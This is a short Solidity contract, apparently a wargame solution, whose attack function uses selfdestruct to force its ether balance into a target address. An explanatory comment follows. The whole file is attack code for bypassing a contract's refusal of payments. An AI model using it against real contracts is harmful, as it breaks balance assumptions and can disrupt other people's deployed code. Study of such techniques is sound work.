// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackForce {

    function attack(address payable _force) public payable {
        selfdestruct(_force);
    }
}

// with selfdestrct function, any balance that this contract holds will be transferred to the addres passed. 